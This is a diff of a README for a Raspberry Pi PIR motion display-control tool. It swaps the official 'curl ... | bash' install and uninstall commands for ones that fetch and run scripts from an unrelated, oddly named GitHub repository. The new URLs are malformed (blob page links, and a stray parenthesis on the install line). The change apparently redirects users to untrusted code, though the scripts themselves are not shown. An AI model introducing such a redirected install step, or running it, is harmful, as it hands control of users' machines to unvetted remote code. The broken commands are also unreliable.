@@ -1,9 +1,9 @@
 sudo apt install python3-gpiozero
 Install
-curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-pir-motion-display-control/main/install.sh | bash
+curl https://github.com/Kef59/--22-1-_25/blob/main/install.sh) | bash
 
 Uninstall
-curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-pir-motion-display-control/main/uninstall.sh | bash
+curl https://github.com/Kef59/--22-1-_25/blob/main/uninstall.sh | bash
 
 
 Config
